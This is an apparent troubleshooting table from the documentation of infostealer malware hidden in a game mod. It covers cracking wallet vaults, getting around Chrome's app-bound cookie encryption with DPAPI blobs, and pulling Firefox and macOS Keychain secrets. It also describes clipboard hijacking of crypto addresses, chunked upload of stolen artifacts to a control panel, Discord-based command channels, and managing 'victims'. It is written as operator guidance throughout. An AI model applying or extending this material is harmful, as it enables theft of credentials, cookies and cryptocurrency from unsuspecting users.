# Known errors and mitigations

Ordered by likelihood. Every entry is contained by design unless stated.

| # | Error | Where | Effect | Mitigation |
|---|---|---|---|---|
| 1 | `wrong_password` on every vault | mod / panel | wallet stays `locked` | Expected until a password is supplied; `crack_vault` reports attempts and never throws into the poller |
| 2 | `app_bound_machine_failed` / `app_bound_user_failed` | Chrome 127+ | cookies unreadable | Falls back to `v10` key when present; otherwise artifact carries raw `Local State` + DPAPI blobs for offline work |
| 3 | `vault_missing_fields` | extension forks | no decrypt | Wallet recorded as `unsupported` with reason; raw LevelDB still dumped |
| 4 | `no_vault` | extension without a vault | crack result `target_not_found`/`no_vault` | Scan already marked the target; UI shows reason |
| 5 | `primary_password` | Firefox | cookies/logins empty | Profile still copied; run `firefox_decrypt` offline with the master password |
| 6 | `keychain_denied` | macOS | Chrome cookies empty | First dump after interactive login; Keychain prompt accepted once |
| 7 | `peanuts` mode | Linux without secret service | only passwords saved after the fallback was set are valid | Marked in `credentials.json`; do not trust v10 values from another machine |
| 8 | Extension LOCK / `IO error` | live browser | partial file | Copy-before-read always; a single unreadable file is skipped |
| 9 | `chunk_hash_mismatch` | upload | chunk rejected | Recomputed from disk per attempt; 3 transport retries with jitter |
| 10 | `offset_mismatch` | resume | upload rewinds | Server returns `received`; agent seeks and continues from that byte |
| 11 | `upload_expired` | 24 h without progress | upload restarts | `POST /artifacts` creates a new upload id; no duplicate artifact because commit is keyed by upload |
| 12 | `commit_409` after a partial resume | upload | artifact not queued | Agent leaves the local `.spc` and state file; next tick re-runs from the stored offset |
| 13 | `clock_skew` | any signed call | 401 | Windows time service expected; agent re-enrolls on repeated 401 and logs drift |
| 14 | `replay` | duplicate nonce | 409 | Nonce is 16 random bytes + counter, regenerated per attempt |
| 15 | `payload_too_large` | upload init | result error | Profile caps (`lite` 64 MiB, `full` 512 MiB); pack skips files over budget and reports `partial` |
| 16 | `artifact_failed:blob_invalid` | panel processing | artifact marked failed | AAD + SHA-256 per blob; original `.spc` kept for retry |
| 17 | `jar_missing` | build compile | 503 | `JAR_SOURCE` mounted read-only; README documents the copy step |
| 18 | `in_use` on build delete | panel | delete blocked | Revoke instead; delete after victims are reassigned/removed |
| 19 | `ip_not_allowlisted` | panel | every API 403 | Check Caddy `X-Real-IP`, then the CIDR list; keep the office/VPN range |
| 20 | `locked` after 5 failures | login | 15 min lockout | Unlock with SQL `update "Operator" set "lockedUntil"=null, "failedAttempts"=0` |
| 21 | `pending_expired` | TOTP setup | login restarts | The pending cookie lasts 10 min; sign in again |
| 22 | Map empty | dashboard | no pins | `GEOIP_DB` missing or private IP; list view still works |
| 23 | WebSocket loops `reconnecting` | panel | no live toasts | Caddy must forward `Upgrade`; check `/api/console/ws` and session expiry |
| 24 | `agent.bin` stale | build | mod ships old agent | `processResources` depends on `copyAgent`; clean build after `agent` changes |
| 25 | ProGuard strips JSON fields | obfuscated build | empty config | Keep `com.serverpackcore.agent.**` and no field renaming (`Json` uses string keys, not reflection) |
| 26 | `Screenshot` headless | lock screen | black PNG | Retried on the next task; `screenshot` is not part of bootstrap |
| 26b | `Screen Capture in the selected area was not allowed` | Linux without a display/lock screen | `screenshot` ends as `error` | Expected in headless sessions; it is not retried in a loop. Retry once an X/Wayland session is active |
| 27 | Clipboard reverts | Windows clipboard manager | replacement lost | The monitor re-applies only when the user copies the original address again; history keeps both |
| 28 | Memory spike on 512 MiB artifact | low-RAM victim | OOM risk | Container built on disk, deflate streamed per file; per-file reads capped by profile |
| 29 | `crypto` disabled | jar without `config.json` | no panel transport | Discord path stays fully functional; `crypto` command says so |
| 30 | Duplicate enrollment | cloned disk | two rows | Unique `(build_id, hostname, username)`; token rotated, old token stops working |

## Delete and channel lifecycle

- Deleting a victim cascades tasks, artifacts, wallets, logs and the Discord link,
  and writes `DiscordIgnore` for the channel. The sweep does not resurrect it.
- Deleting a Discord channel in Discord leaves the link `missingAt`; recreate the
  same channel name or delete the victim and re-link.
- Deleting an artifact removes the extracted directory, the container file, its
  wallets and screenshots, and writes an audit row.

## Deliberately not retried

- Bad build token (`unknown_build`): needs a new jar.
- Revoked build/victim (`403`/`410`): agent stops and preserves local data.
- `unknown_task`: result is reported and the queue moves on.
- Headless `screenshot` denial: reported once as an error, never in a loop.
